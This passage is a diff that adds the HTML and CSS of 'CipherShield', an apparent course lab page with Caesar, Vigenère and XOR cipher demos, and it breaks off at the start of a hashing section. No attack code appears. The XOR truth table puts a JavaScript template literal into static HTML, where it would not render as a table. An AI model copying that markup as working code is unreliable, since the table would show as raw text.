@@ -1,0 +1,1460 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CipherShield — Web Security & Cryptography Lab</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Share+Tech+Mono&family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:       #03050a;
+  --s1:       #060c14;
+  --s2:       #091220;
+  --s3:       #0d1a2e;
+  --s4:       #122038;
+  --border:   #1a3050;
+  --border2:  #223d60;
+  --green:    #00ff88;
+  --green2:   #00cc6a;
+  --green3:   #007a40;
+  --red:      #ff3355;
+  --red2:     #cc1133;
+  --orange:   #ff8c00;
+  --yellow:   #ffd700;
+  --cyan:     #00d4ff;
+  --blue:     #0066ff;
+  --violet:   #9b59ff;
+  --white:    #e8f4ff;
+  --gray:     #6a8faf;
+  --muted:    #2d4d6a;
+  --glow-g:   0 0 20px rgba(0,255,136,.18);
+  --glow-r:   0 0 20px rgba(255,51,85,.18);
+  --glow-c:   0 0 20px rgba(0,212,255,.15);
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+
+body {
+  font-family:'Outfit',sans-serif;
+  background:var(--bg);
+  color:var(--white);
+  min-height:100vh;
+  display:flex;
+  overflow:hidden;
+}
+
+/* ─── SCANLINE overlay ──── */
+body::after {
+  content:'';
+  position:fixed;inset:0;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,.012) 2px,rgba(0,255,136,.012) 4px);
+  pointer-events:none;z-index:9999;
+}
+
+/* ─── SIDEBAR ─────────── */
+.sidebar {
+  width:250px;flex-shrink:0;
+  background:var(--s1);
+  border-right:1px solid var(--border);
+  display:flex;flex-direction:column;
+  position:relative;z-index:20;
+}
+.sidebar::before {
+  content:'';position:absolute;
+  top:0;right:0;width:1px;height:100%;
+  background:linear-gradient(180deg,var(--green),transparent 60%);
+}
+
+.logo-zone {
+  padding:22px 18px 18px;
+  border-bottom:1px solid var(--border);
+  position:relative;
+}
+.logo-box {
+  display:flex;align-items:center;gap:10px;
+  background:linear-gradient(135deg,rgba(0,255,136,.08),rgba(0,212,255,.04));
+  border:1px solid rgba(0,255,136,.2);
+  border-radius:10px;padding:10px 14px;
+  margin-bottom:8px;
+}
+.logo-icon-wrap {
+  width:36px;height:36px;
+  background:var(--green3);
+  border-radius:8px;
+  display:flex;align-items:center;justify-content:center;
+  font-size:18px;
+  box-shadow:0 0 14px rgba(0,255,136,.3);
+}
+.logo-text {
+  font-family:'Rajdhani',sans-serif;
+  font-size:20px;font-weight:700;
+  color:var(--green);letter-spacing:1px;
+}
+.logo-course {
+  font-size:10px;color:var(--muted);
+  letter-spacing:2px;text-transform:uppercase;
+}
+
+.nav{padding:10px 10px;flex:1;overflow-y:auto;}
+.nav-section {
+  font-size:9px;font-weight:700;letter-spacing:2.5px;text-transform:uppercase;
+  color:var(--muted);padding:10px 10px 5px;
+}
+.nav-item {
+  display:flex;align-items:center;gap:10px;
+  padding:9px 10px;border-radius:6px;
+  cursor:pointer;transition:all .2s;
+  font-size:13px;color:var(--gray);
+  border:1px solid transparent;margin-bottom:2px;
+  font-weight:500;
+  position:relative;
+}
+.nav-item:hover{background:var(--s2);color:var(--white);border-color:var(--border);}
+.nav-item.active {
+  background:rgba(0,255,136,.06);
+  color:var(--green);border-color:rgba(0,255,136,.25);
+}
+.nav-item.active::before {
+  content:'';position:absolute;left:0;top:0;bottom:0;width:3px;
+  background:var(--green);border-radius:3px 0 0 3px;
+}
+.nav-icon{font-size:15px;width:20px;text-align:center;}
+.threat-badge{
+  margin-left:auto;padding:2px 6px;border-radius:3px;
+  font-size:9px;font-weight:700;font-family:'Share Tech Mono',monospace;
+}
+.badge-red{background:rgba(255,51,85,.2);color:var(--red);border:1px solid rgba(255,51,85,.3);}
+.badge-orange{background:rgba(255,140,0,.15);color:var(--orange);}
+.badge-green{background:rgba(0,255,136,.1);color:var(--green);}
+
+.sidebar-bottom {
+  padding:14px 16px;border-top:1px solid var(--border);
+}
+.threat-level {
+  display:flex;align-items:center;gap:8px;
+  font-size:11px;color:var(--gray);
+  background:rgba(255,51,85,.06);
+  border:1px solid rgba(255,51,85,.15);
+  border-radius:6px;padding:8px 10px;
+}
+.pulse {
+  width:8px;height:8px;background:var(--green);border-radius:50%;
+  box-shadow:0 0 8px var(--green);
+  animation:pulse 2s infinite;
+}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1);}50%{opacity:.5;transform:scale(.85);}}
+
+/* ─── MAIN ─────────────── */
+.main{flex:1;overflow-y:auto;height:100vh;}
+.topbar {
+  position:sticky;top:0;z-index:10;
+  padding:14px 28px;
+  background:rgba(3,5,10,.92);
+  backdrop-filter:blur(16px);
+  border-bottom:1px solid var(--border);
+  display:flex;align-items:center;justify-content:space-between;
+}
+.page-head .title {
+  font-family:'Rajdhani',sans-serif;
+  font-size:22px;font-weight:700;letter-spacing:1px;
+}
+.page-head .sub{font-size:11.5px;color:var(--gray);margin-top:2px;}
+
+.status-bar {
+  display:flex;align-items:center;gap:8px;
+  font-family:'Share Tech Mono',monospace;
+  font-size:10px;color:var(--green);
+  background:rgba(0,255,136,.05);
+  border:1px solid rgba(0,255,136,.15);
+  border-radius:6px;padding:6px 12px;
+}
+
+.content{padding:22px 28px;}
+.page{display:none;}
+.page.active{display:block;}
+
+/* ─── CARDS ──────────── */
+.card {
+  background:var(--s1);border:1px solid var(--border);
+  border-radius:10px;overflow:hidden;margin-bottom:20px;
+}
+.card-top-green { border-top:2px solid var(--green); }
+.card-top-red   { border-top:2px solid var(--red); }
+.card-top-cyan  { border-top:2px solid var(--cyan); }
+.card-top-orange{ border-top:2px solid var(--orange); }
+.card-top-violet{ border-top:2px solid var(--violet); }
+
+.card-head {
+  padding:12px 20px;border-bottom:1px solid var(--border);
+  display:flex;align-items:center;justify-content:space-between;
+}
+.card-title{font-size:14px;font-weight:600;font-family:'Rajdhani',sans-serif;letter-spacing:.5px;}
+.card-sub{font-size:11px;color:var(--gray);margin-top:2px;}
+.card-body{padding:20px;}
+
+.g2{display:grid;grid-template-columns:1fr 1fr;gap:18px;}
+.g3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px;}
+.g4{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;}
+
+/* ─── STAT CARDS ──────── */
+.stat-card {
+  background:var(--s2);border:1px solid var(--border);border-radius:10px;
+  padding:18px;position:relative;overflow:hidden;
+}
+.stat-card::after{
+  content:'';position:absolute;top:-20px;right:-20px;
+  width:80px;height:80px;border-radius:50%;
+  background:radial-gradient(circle,var(--glow-color,.1) 0%,transparent 70%);
+}
+.stat-val{
+  font-family:'Rajdhani',sans-serif;font-size:32px;font-weight:700;
+  line-height:1;
+}
+.stat-lbl{font-size:11px;color:var(--gray);margin-top:6px;}
+
+/* ─── TERMINAL ──────── */
+.terminal {
+  background:#000;border:1px solid var(--green3);border-radius:8px;
+  font-family:'Share Tech Mono',monospace;font-size:12px;
+  color:var(--green);padding:16px;min-height:80px;
+  line-height:1.7;white-space:pre-wrap;word-break:break-all;
+  position:relative;
+}
+.terminal::before {
+  content:'> ';color:var(--green2);
+}
+.terminal .t-red{color:var(--red);}
+.terminal .t-orange{color:var(--orange);}
+.terminal .t-cyan{color:var(--cyan);}
+.terminal .t-gray{color:var(--muted);}
+.terminal .t-yellow{color:var(--yellow);}
+
+/* ─── CODE BLOCK ───── */
+.code-block {
+  background:#000;border:1px solid var(--border2);border-radius:8px;
+  font-family:'Share Tech Mono',monospace;font-size:11.5px;
+  padding:16px;margin:10px 0;line-height:1.8;
+  overflow-x:auto;position:relative;
+}
+.c-kw{color:#ff79c6;}
+.c-fn{color:#50fa7b;}
+.c-str{color:#f1fa8c;}
+.c-cmt{color:var(--muted);}
+.c-val{color:#bd93f9;}
+.c-tag{color:var(--cyan);}
+.c-attr{color:var(--orange);}
+
+/* ─── INPUT/BTN ─────── */
+input,select,textarea{
+  background:var(--s2);border:1px solid var(--border);
+  color:var(--white);border-radius:6px;
+  font-family:'Outfit',sans-serif;font-size:13px;
+  padding:9px 12px;transition:all .2s;width:100%;
+}
+input:focus,select:focus,textarea:focus{
+  outline:none;border-color:var(--green3);
+  box-shadow:0 0 0 3px rgba(0,255,136,.07);
+}
+textarea{resize:vertical;min-height:70px;}
+label{font-size:11px;font-weight:600;color:var(--gray);letter-spacing:.5px;text-transform:uppercase;display:block;margin-bottom:5px;}
+.fg{margin-bottom:14px;}
+select option{background:var(--s2);}
+
+.btn{
+  padding:9px 18px;border-radius:6px;border:none;
+  font-family:'Rajdhani',sans-serif;font-size:13px;font-weight:700;
+  cursor:pointer;transition:all .2s;display:inline-flex;align-items:center;gap:6px;
+  letter-spacing:.5px;
+}
+.btn-green{
+  background:var(--green);color:#000;
+  box-shadow:0 4px 16px rgba(0,255,136,.25);
+}
+.btn-green:hover{transform:translateY(-1px);box-shadow:0 6px 22px rgba(0,255,136,.35);}
+.btn-red{background:var(--red);color:#fff;box-shadow:0 4px 14px rgba(255,51,85,.25);}
+.btn-ghost{background:transparent;color:var(--gray);border:1px solid var(--border);}
+.btn-ghost:hover{background:var(--s2);color:var(--white);}
+.btn-cyan{background:var(--cyan);color:#000;}
+.btn-orange{background:var(--orange);color:#000;}
+.btn-sm{padding:6px 12px;font-size:12px;}
+
+/* ─── BADGES ─────────── */
+.badge{display:inline-flex;align-items:center;gap:4px;padding:3px 10px;border-radius:4px;font-size:10.5px;font-weight:700;font-family:'Share Tech Mono',monospace;}
+.badge-safe{background:rgba(0,255,136,.1);color:var(--green);border:1px solid rgba(0,255,136,.2);}
+.badge-warn{background:rgba(255,140,0,.12);color:var(--orange);border:1px solid rgba(255,140,0,.2);}
+.badge-crit{background:rgba(255,51,85,.1);color:var(--red);border:1px solid rgba(255,51,85,.2);}
+.badge-info{background:rgba(0,212,255,.1);color:var(--cyan);border:1px solid rgba(0,212,255,.2);}
+
+/* ─── PASSWORD STRENGTH ─ */
+.pwd-meter{height:6px;background:var(--border);border-radius:3px;overflow:hidden;margin-top:8px;}
+.pwd-fill{height:100%;border-radius:3px;transition:all .4s ease;}
+
+/* ─── CIPHER OUTPUT ──── */
+.cipher-output {
+  background:#000;border:1px solid var(--green3);border-radius:8px;
+  padding:14px 18px;margin-top:12px;
+  font-family:'Share Tech Mono',monospace;font-size:13px;
+  color:var(--green);letter-spacing:1.5px;word-break:break-all;
+  min-height:50px;line-height:1.8;
+}
+
+/* ─── THREAT CARDS ───── */
+.threat-card {
+  background:var(--s2);border:1px solid var(--border);border-radius:10px;
+  padding:18px;cursor:pointer;transition:all .25s;
+  position:relative;overflow:hidden;
+}
+.threat-card:hover{transform:translateY(-2px);box-shadow:var(--glow-r);}
+.threat-card::before {
+  content:'';position:absolute;top:0;left:0;right:0;height:3px;
+  background:var(--t-color,var(--red));
+}
+.threat-icon{font-size:32px;margin-bottom:10px;}
+.threat-name{font-family:'Rajdhani',sans-serif;font-size:15px;font-weight:700;margin-bottom:4px;}
+.threat-desc{font-size:11.5px;color:var(--gray);line-height:1.5;}
+.severity{
+  position:absolute;top:14px;right:14px;
+  font-size:9px;font-weight:700;padding:3px 7px;border-radius:3px;
+  font-family:'Share Tech Mono',monospace;
+}
+
+/* ─── HASH DISPLAY ───── */
+.hash-output {
+  font-family:'Share Tech Mono',monospace;
+  font-size:11px;color:var(--cyan);
+  background:#000;border:1px solid rgba(0,212,255,.2);
+  border-radius:6px;padding:12px 14px;
+  word-break:break-all;letter-spacing:1px;
+  line-height:1.7;margin-top:10px;
+}
+
+/* ─── SCROLLBAR ──────── */
+::-webkit-scrollbar{width:5px;}
+::-webkit-scrollbar-track{background:var(--bg);}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:3px;}
+
+/* ─── TOAST ──────────── */
+.toast {
+  position:fixed;bottom:20px;right:20px;
+  background:var(--s2);border:1px solid var(--border);
+  border-left:3px solid var(--green);
+  border-radius:8px;padding:12px 18px;
+  font-size:12.5px;z-index:9998;
+  transform:translateX(200%);transition:transform .3s;
+  box-shadow:0 8px 32px rgba(0,0,0,.6);
+  font-family:'Share Tech Mono',monospace;
+  max-width:320px;
+}
+.toast.show{transform:translateX(0);}
+.toast.danger{border-left-color:var(--red);}
+
+/* ─── SECTION TITLES ─── */
+.sec-title{
+  font-size:9px;font-weight:700;letter-spacing:2px;text-transform:uppercase;
+  color:var(--muted);margin:0 0 10px;
+}
+
+/* ─── MODULE HOME CARDS ─ */
+.mod-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-bottom:22px;}
+.mod-card{
+  background:var(--s2);border:1px solid var(--border);border-radius:10px;
+  padding:20px;cursor:pointer;transition:all .25s;text-align:center;
+  position:relative;overflow:hidden;
+}
+.mod-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:var(--mc,var(--green));transition:all .25s;}
+.mod-card:hover{transform:translateY(-3px);border-color:var(--border2);}
+.mod-card .mc-icon{font-size:32px;margin-bottom:10px;}
+.mod-card .mc-title{font-family:'Rajdhani',sans-serif;font-size:14px;font-weight:700;letter-spacing:.5px;}
+.mod-card .mc-desc{font-size:11px;color:var(--gray);margin-top:5px;line-height:1.5;}
+
+/* ─── OWASP TABLE ──────── */
+table.owasp{width:100%;border-collapse:collapse;}
+table.owasp th{
+  background:var(--s3);padding:10px 16px;
+  font-size:10.5px;color:var(--gray);letter-spacing:1px;
+  text-transform:uppercase;text-align:left;border:1px solid var(--border);
+  font-family:'Rajdhani',sans-serif;
+}
+table.owasp td{
+  padding:12px 16px;font-size:12.5px;color:var(--gray);
+  border:1px solid var(--border);vertical-align:top;
+}
+table.owasp tr:hover td{background:var(--s2);}
+.owasp-rank{font-family:'Share Tech Mono',monospace;font-size:13px;color:var(--orange);font-weight:700;}
+.owasp-name{color:var(--white);font-weight:600;font-size:13px;}
+
+/* ─── PROGRESS ──────────── */
+.prog{height:6px;background:var(--border);border-radius:3px;overflow:hidden;margin-top:5px;}
+.prog-fill{height:100%;border-radius:3px;}
+
+/* ─── ENCRYPTION VISUAL ─ */
+.enc-visual{
+  display:flex;align-items:center;gap:12px;
+  padding:14px;background:var(--bg);
+  border:1px solid var(--border);border-radius:8px;margin-top:12px;
+}
+.enc-block{
+  background:var(--s3);border:1px solid var(--border2);
+  border-radius:6px;padding:10px 14px;
+  font-family:'Share Tech Mono',monospace;font-size:11.5px;
+  color:var(--white);min-width:120px;text-align:center;
+}
+.enc-arrow{color:var(--green);font-size:18px;}
+
+.alert-box{
+  border-radius:8px;padding:12px 16px;
+  font-size:12.5px;margin:12px 0;
+  display:flex;align-items:flex-start;gap:10px;
+}
+.alert-safe{background:rgba(0,255,136,.06);border:1px solid rgba(0,255,136,.2);color:var(--green);}
+.alert-warn{background:rgba(255,140,0,.07);border:1px solid rgba(255,140,0,.2);color:var(--orange);}
+.alert-crit{background:rgba(255,51,85,.07);border:1px solid rgba(255,51,85,.2);color:var(--red);}
+.alert-info{background:rgba(0,212,255,.06);border:1px solid rgba(0,212,255,.2);color:var(--cyan);}
+</style>
+</head>
+<body>
+
+<!-- ═══ SIDEBAR ═══════════════════════════════════════ -->
+<nav class="sidebar">
+  <div class="logo-zone">
+    <div class="logo-box">
+      <div class="logo-icon-wrap">🛡</div>
+      <div>
+        <div class="logo-text">CipherShield</div>
+        <div class="logo-course">CSC 434 — Web & Security</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="nav">
+    <div class="nav-section">Overview</div>
+    <div class="nav-item active" onclick="navigate('home',this)">
+      <span class="nav-icon">⬡</span> Home Dashboard
+    </div>
+
+    <div class="nav-section">Cryptography</div>
+    <div class="nav-item" onclick="navigate('caesar',this)">
+      <span class="nav-icon">🔠</span> Caesar Cipher
+    </div>
+    <div class="nav-item" onclick="navigate('vigenere',this)">
+      <span class="nav-icon">🔑</span> Vigenère Cipher
+    </div>
+    <div class="nav-item" onclick="navigate('xor',this)">
+      <span class="nav-icon">⊕</span> XOR Encryption
+    </div>
+    <div class="nav-item" onclick="navigate('hashing',this)">
+      <span class="nav-icon">#</span> Hash Functions
+    </div>
+
+    <div class="nav-section">Web Security</div>
+    <div class="nav-item" onclick="navigate('owasp',this)">
+      <span class="nav-icon">⚠</span> OWASP Top 10
+      <span class="threat-badge badge-red">HIGH</span>
+    </div>
+    <div class="nav-item" onclick="navigate('xss',this)">
+      <span class="nav-icon">💉</span> XSS Attacks
+      <span class="threat-badge badge-red">CRIT</span>
+    </div>
+    <div class="nav-item" onclick="navigate('sqli',this)">
+      <span class="nav-icon">🗄</span> SQL Injection
+      <span class="threat-badge badge-red">CRIT</span>
+    </div>
+    <div class="nav-item" onclick="navigate('auth',this)">
+      <span class="nav-icon">🔐</span> Authentication
+    </div>
+    <div class="nav-item" onclick="navigate('https',this)">
+      <span class="nav-icon">🔒</span> HTTPS & SSL/TLS
+    </div>
+    <div class="nav-item" onclick="navigate('headers',this)">
+      <span class="nav-icon">📋</span> Security Headers
+    </div>
+    <div class="nav-item" onclick="navigate('password',this)">
+      <span class="nav-icon">🔏</span> Password Security
+    </div>
+  </div>
+
+  <div class="sidebar-bottom">
+    <div class="threat-level">
+      <div class="pulse"></div>
+      <span>Security Lab Active</span>
+    </div>
+    <div style="font-size:10px;color:var(--muted);margin-top:8px;font-family:'Share Tech Mono',monospace;">CSC 434 | 400L CS | SIWES</div>
+  </div>
+</nav>
+
+<!-- ═══ MAIN ═══════════════════════════════════════════ -->
+<main class="main">
+  <div class="topbar">
+    <div class="page-head">
+      <div class="title" id="page-title">SECURITY DASHBOARD</div>
+      <div class="sub" id="page-sub">CSC 434: Web Design and Data Security — Interactive Security Lab</div>
+    </div>
+    <div class="status-bar">
+      <span>🟢</span> <span id="sys-status">SYSTEM SECURE</span>
+      <span style="color:var(--muted);">|</span>
+      <span id="clock" style="color:var(--gray);"></span>
+    </div>
+  </div>
+
+  <div class="content">
+
+  <!-- ════ HOME PAGE ═════════════════════════════════════ -->
+  <div class="page active" id="page-home">
+    <div class="g4" style="margin-bottom:20px;">
+      <div class="stat-card" style="border-top:2px solid var(--green);">
+        <div class="stat-val" style="color:var(--green)">7</div>
+        <div class="stat-lbl">Crypto Algorithms</div>
+      </div>
+      <div class="stat-card" style="border-top:2px solid var(--red);">
+        <div class="stat-val" style="color:var(--red)">10</div>
+        <div class="stat-lbl">OWASP Vulnerabilities</div>
+      </div>
+      <div class="stat-card" style="border-top:2px solid var(--cyan);">
+        <div class="stat-val" style="color:var(--cyan)">256</div>
+        <div class="stat-lbl">SHA Bits</div>
+      </div>
+      <div class="stat-card" style="border-top:2px solid var(--orange);">
+        <div class="stat-val" style="color:var(--orange)">TLS</div>
+        <div class="stat-lbl">Protocol Used</div>
+      </div>
+    </div>
+
+    <div class="mod-grid">
+      <div class="mod-card" style="--mc:var(--green)" onclick="navigate('caesar',null)">
+        <div class="mc-icon">🔠</div>
+        <div class="mc-title">Caesar Cipher</div>
+        <div class="mc-desc">Substitution cipher with configurable shift key. Encrypt and decrypt messages.</div>
+      </div>
+      <div class="mod-card" style="--mc:var(--cyan)" onclick="navigate('vigenere',null)">
+        <div class="mc-icon">🔑</div>
+        <div class="mc-title">Vigenère Cipher</div>
+        <div class="mc-desc">Polyalphabetic substitution using a keyword for stronger encryption.</div>
+      </div>
+      <div class="mod-card" style="--mc:var(--violet)" onclick="navigate('xor',null)">
+        <div class="mc-icon">⊕</div>
+        <div class="mc-title">XOR Encryption</div>
+        <div class="mc-desc">Bitwise XOR stream cipher — foundation of modern symmetric encryption.</div>
+      </div>
+      <div class="mod-card" style="--mc:var(--yellow)" onclick="navigate('hashing',null)">
+        <div class="mc-icon">#</div>
+        <div class="mc-title">Hash Functions</div>
+        <div class="mc-desc">MD5, SHA-1, SHA-256 demonstration — one-way transformation concepts.</div>
+      </div>
+      <div class="mod-card" style="--mc:var(--red)" onclick="navigate('owasp',null)">
+        <div class="mc-icon">⚠️</div>
+        <div class="mc-title">OWASP Top 10</div>
+        <div class="mc-desc">The 10 most critical web application security vulnerabilities explained.</div>
+      </div>
+      <div class="mod-card" style="--mc:var(--red)" onclick="navigate('xss',null)">
+        <div class="mc-icon">💉</div>
+        <div class="mc-title">XSS Lab</div>
+        <div class="mc-desc">Cross-Site Scripting attack demo, impact analysis, and prevention techniques.</div>
+      </div>
+      <div class="mod-card" style="--mc:var(--red)" onclick="navigate('sqli',null)">
+        <div class="mc-icon">🗄️</div>
+        <div class="mc-title">SQL Injection Lab</div>
+        <div class="mc-desc">SQL injection patterns, bypass techniques, and parameterized query defenses.</div>
+      </div>
+      <div class="mod-card" style="--mc:var(--orange)" onclick="navigate('auth',null)">
+        <div class="mc-icon">🔐</div>
+        <div class="mc-title">Authentication</div>
+        <div class="mc-desc">Secure login systems, JWT tokens, session management, MFA principles.</div>
+      </div>
+      <div class="mod-card" style="--mc:var(--cyan)" onclick="navigate('https',null)">
+        <div class="mc-icon">🔒</div>
+        <div class="mc-title">HTTPS & SSL/TLS</div>
+        <div class="mc-desc">TLS handshake, certificate chain, asymmetric & symmetric key exchange.</div>
+      </div>
+    </div>
+
+    <div class="card card-top-green">
+      <div class="card-head"><div><div class="card-title">📚 COURSE ALIGNMENT — CSC 434</div><div class="card-sub">Every project module maps to a course topic</div></div></div>
+      <div class="card-body">
+        <div class="g3">
+          <div>
+            <div class="sec-title">Web Design</div>
+            <div style="font-size:12px;color:var(--gray);line-height:2.1;">
+              HTML5 Semantic Structure<br>CSS3 Variables & Dark Theme<br>Responsive Layouts (Grid/Flex)<br>JavaScript Interactivity<br>Canvas & DOM Manipulation<br>Progressive Enhancement
+            </div>
+          </div>
+          <div>
+            <div class="sec-title">Cryptography</div>
+            <div style="font-size:12px;color:var(--gray);line-height:2.1;">
+              Substitution Ciphers (Caesar)<br>Polyalphabetic (Vigenère)<br>Symmetric Encryption (XOR, AES concept)<br>Asymmetric (RSA concept)<br>Hash Functions (SHA-256)<br>Digital Signatures
+            </div>
+          </div>
+          <div>
+            <div class="sec-title">Web Security</div>
+            <div style="font-size:12px;color:var(--gray);line-height:2.1;">
+              OWASP Top 10 Vulnerabilities<br>XSS & CSRF Attacks<br>SQL Injection & Prevention<br>Authentication & Authorization<br>HTTPS / TLS Protocol<br>Security Headers & CSP
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════ CAESAR CIPHER ══════════════════════════════ -->
+  <div class="page" id="page-caesar">
+    <div class="g2">
+      <div class="card card-top-green">
+        <div class="card-head"><div><div class="card-title">🔠 CAESAR CIPHER</div><div class="card-sub">ROT-N substitution cipher. Shift each letter by N positions.</div></div></div>
+        <div class="card-body">
+          <div class="fg"><label>Plaintext Message</label><textarea id="caesar-in" rows="3" placeholder="Enter your message here...">ATTACK AT DAWN</textarea></div>
+          <div class="fg"><label>Shift Key (1–25)</label><input type="range" id="caesar-shift" min="1" max="25" value="3" oninput="updateCaesarShift();caesarProcess()"><div style="text-align:center;font-family:'Share Tech Mono',monospace;font-size:18px;color:var(--green);margin-top:4px;">Shift = <span id="shift-display">3</span></div></div>
+          <div style="display:flex;gap:10px;">
+            <button class="btn btn-green" onclick="caesarProcess()">🔒 ENCRYPT</button>
+            <button class="btn btn-ghost" onclick="caesarDecrypt()">🔓 DECRYPT</button>
+          </div>
+          <div class="cipher-output" id="caesar-out">DWWDFN DW GDZQ</div>
+          <button class="btn btn-ghost btn-sm" style="margin-top:8px;" onclick="document.getElementById('caesar-out').textContent&&navigator.clipboard.writeText(document.getElementById('caesar-out').textContent).then(()=>showToast('Copied!'))">📋 Copy</button>
+        </div>
+      </div>
+      <div class="card card-top-cyan">
+        <div class="card-head"><div class="card-title">📊 SHIFT TABLE</div></div>
+        <div class="card-body">
+          <div class="sec-title">Alphabet Mapping (Shift = <span id="shift-table-val">3</span>)</div>
+          <div id="shift-table" style="font-family:'Share Tech Mono',monospace;font-size:11px;line-height:2;color:var(--gray);"></div>
+          <div style="margin-top:16px;" class="alert-info">
+            <span>ℹ️</span>
+            <div><strong>History:</strong> Used by Julius Caesar (58 BC) for military communications. ROT-13 (shift=13) is the most common modern variant. Easily broken with frequency analysis.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="card card-top-red">
+      <div class="card-head"><div class="card-title">🔍 FREQUENCY ANALYSIS (Attack on Caesar)</div></div>
+      <div class="card-body">
+        <div style="font-size:12.5px;color:var(--gray);margin-bottom:14px;">In English, 'E' is most frequent (~12.7%). By analyzing letter frequencies in ciphertext, the shift can be determined — making Caesar cipher <span style="color:var(--red)">cryptographically weak</span>.</div>
+        <div id="freq-analysis" style="display:flex;flex-wrap:wrap;gap:4px;"></div>
+        <div class="alert-crit" style="margin-top:14px;"><span>⚠️</span><div>Caesar cipher is <strong>NOT secure</strong> for real use. It provides only 25 possible keys — brute-forceable in seconds.</div></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════ VIGENÈRE CIPHER ════════════════════════════ -->
+  <div class="page" id="page-vigenere">
+    <div class="g2">
+      <div class="card card-top-cyan">
+        <div class="card-head"><div><div class="card-title">🔑 VIGENÈRE CIPHER</div><div class="card-sub">Polyalphabetic cipher — each letter uses a different Caesar shift based on the keyword.</div></div></div>
+        <div class="card-body">
+          <div class="fg"><label>Plaintext</label><textarea id="vig-in" rows="3" placeholder="Enter message...">WEAREDISCOVEREDFLEEATONCE</textarea></div>
+          <div class="fg"><label>Keyword</label><input id="vig-key" value="CRYPTO" placeholder="e.g. SECURITY"></div>
+          <div style="display:flex;gap:10px;">
+            <button class="btn btn-cyan" onclick="vigenereProcess(true)">🔒 ENCRYPT</button>
+            <button class="btn btn-ghost" onclick="vigenereProcess(false)">🔓 DECRYPT</button>
+          </div>
+          <div class="cipher-output" id="vig-out"></div>
+        </div>
+      </div>
+      <div class="card card-top-green">
+        <div class="card-head"><div class="card-title">📐 HOW IT WORKS</div></div>
+        <div class="card-body">
+          <div class="sec-title">Encryption Formula</div>
+          <div class="code-block" style="font-size:12px;">Cᵢ = (Pᵢ + Kᵢ) mod 26
+Dᵢ = (Cᵢ - Kᵢ + 26) mod 26
+
+Where:
+  Pᵢ = Plaintext letter position (A=0)
+  Kᵢ = Key letter (repeating) position
+  Cᵢ = Ciphertext letter position</div>
+          <div id="vig-visual" style="margin-top:14px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--gray);line-height:2;"></div>
+          <div class="alert-info" style="margin-top:12px;"><span>ℹ️</span><div>Vigenère resisted decryption for ~300 years until Kasiski (1863) found a way to break it by finding repeated patterns to determine key length.</div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════ XOR ENCRYPTION ════════════════════════════ -->
+  <div class="page" id="page-xor">
+    <div class="g2">
+      <div class="card card-top-violet">
+        <div class="card-head"><div><div class="card-title">⊕ XOR ENCRYPTION</div><div class="card-sub">Bitwise XOR — the foundation of stream ciphers and modern symmetric encryption (AES).</div></div></div>
+        <div class="card-body">
+          <div class="fg"><label>Plaintext</label><input id="xor-in" value="Hello World" placeholder="Enter text to encrypt..."></div>
+          <div class="fg"><label>Key (secret key string)</label><input id="xor-key" value="KEY" placeholder="Enter encryption key..."></div>
+          <div style="display:flex;gap:10px;">
+            <button class="btn btn-green" onclick="xorProcess(true)">🔒 ENCRYPT → HEX</button>
+            <button class="btn btn-ghost" onclick="xorProcess(false)">🔓 DECRYPT</button>
+          </div>
+          <div class="cipher-output" id="xor-out" style="color:var(--violet);"></div>
+          <div id="xor-bits" style="margin-top:12px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--muted);line-height:1.7;"></div>
+        </div>
+      </div>
+      <div class="card card-top-green">
+        <div class="card-head"><div class="card-title">⚡ XOR TRUTH TABLE & PROPERTIES</div></div>
+        <div class="card-body">
+          <table style="width:100%;border-collapse:collapse;font-family:'Share Tech Mono',monospace;font-size:12px;margin-bottom:14px;">
+            <thead><tr style="background:var(--s3);">
+              <th style="padding:8px 12px;color:var(--green);border:1px solid var(--border);">A</th>
+              <th style="padding:8px 12px;color:var(--cyan);border:1px solid var(--border);">B</th>
+              <th style="padding:8px 12px;color:var(--violet);border:1px solid var(--border);">A ⊕ B</th>
+            </tr></thead>
+            <tbody>
+              ${[[0,0,0],[0,1,1],[1,0,1],[1,1,0]].map(([a,b,r])=>`<tr><td style="padding:8px 12px;text-align:center;border:1px solid var(--border);color:${a?'var(--green)':'var(--muted)'};">${a}</td><td style="padding:8px 12px;text-align:center;border:1px solid var(--border);color:${b?'var(--cyan)':'var(--muted)'};">${b}</td><td style="padding:8px 12px;text-align:center;border:1px solid var(--border);color:${r?'var(--violet)':'var(--muted);'}font-weight:bold;">${r}</td></tr>`).join('')}
+            </tbody>
+          </table>
+          <div class="sec-title">Key Properties</div>
+          <div style="font-size:12px;color:var(--gray);line-height:2.2;font-family:'Share Tech Mono',monospace;">
+            <span style="color:var(--green)">Self-inverse:</span> A⊕A = 0<br>
+            <span style="color:var(--cyan)">Identity:</span> A⊕0 = A<br>
+            <span style="color:var(--violet)">Commutative:</span> A⊕B = B⊕A<br>
+            <span style="color:var(--orange)">Decryption:</span> (P⊕K)⊕K = P<br>
+            <span style="color:var(--green)">One-Time Pad:</span> Unbreakable if key is truly random & same length
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════ HASHING PAGE ═══════════════════════════════ -->
+  <div class="page" id="page-hashing">
+    <div class="g2">
+      <div class="card card-top-yellow">
+        <div class="card-head"><div><div class="card-title"># HASH FUNCTION DEMO</div><div class="card-sub">One-way functions — cannot be reversed (computationally infeasible)</div></div></div>
